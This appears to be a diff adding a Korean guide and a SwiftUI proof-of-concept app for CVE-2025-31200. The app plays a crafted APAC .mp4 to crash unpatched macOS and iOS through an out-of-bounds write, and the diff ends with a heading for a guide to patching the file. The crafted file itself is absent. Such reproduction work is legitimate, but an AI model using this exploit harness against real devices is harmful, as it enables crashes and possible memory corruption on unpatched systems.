@@ -1,4 +1,86 @@
 
+
+# APACExploitPlayer 사용법
+
+---
+
+## 1. 프로젝트 설정
+
+- Xcode에서 `App` 타입 새 프로젝트 생성 (SwiftUI)
+- 파일 추가 → `APACExploitPlayer.swift` 복사
+- `.mp4` 파일을 프로젝트에 추가하고 `"output_apac_patch.mp4"`로 이름 설정
+    - `Target Membership` 체크 필수
+    - `Copy Bundle Resources`에 포함
+
+---
+
+## 2. 실행
+
+- 시뮬레이터 또는 실기기(macOS, iPhone)에서 실행
+- 버튼 클릭 시 오디오 재생 시작
+- 시스템이 패치되지 않은 경우 **AVPlayer 재생 중 충돌 발생 가능**
+
+---
+
+## 3. 주의사항
+
+- macOS < 15.4.1 또는 iOS < 18.4.1 필요
+- `output_apac_patch.mp4`는 앞에서 설명한 방식으로 생성되어야 함
+- 디버그 로그 또는 크래시 로그에서 `APACChannelRemapper::Process`나 `memmove` 위치 충돌 확인 가능
+
+---
+
+
+
+// File: APACExploitPlayer.swift
+// Platform: macOS or iOS (SwiftUI/macCatalyst supported)
+// Description: Loads a patched APAC .mp4 file to trigger the CVE-2025-31200 crash
+
+import SwiftUI
+import AVFoundation
+
+@main
+struct APACExploitApp: App {
+    var body: some Scene {
+        WindowGroup {
+            ContentView()
+        }
+    }
+}
+
+struct ContentView: View {
+    var player: AVPlayer {
+        let url = Bundle.main.url(forResource: "output_apac_patch", withExtension: "mp4")!
+        let item = AVPlayerItem(url: url)
+
+        // Optional: set audio session for foreground playback
+        try? AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [])
+        try? AVAudioSession.sharedInstance().setActive(true)
+
+        return AVPlayer(playerItem: item)
+    }
+
+    var body: some View {
+        VStack(spacing: 20) {
+            Text("APAC Exploit PoC")
+                .font(.title)
+
+            Button("▶️ Play Exploit File") {
+                player.play()
+            }
+
+            Text("If the system is vulnerable, playback will crash due to OOB.")
+                .font(.caption)
+                .padding()
+        }
+        .padding()
+    }
+}
+
+
+
+
+
 # APAC MP4 바이너리 패치 가이드: mChannelLayoutTag 조작으로 OOB 유도
 
 ---
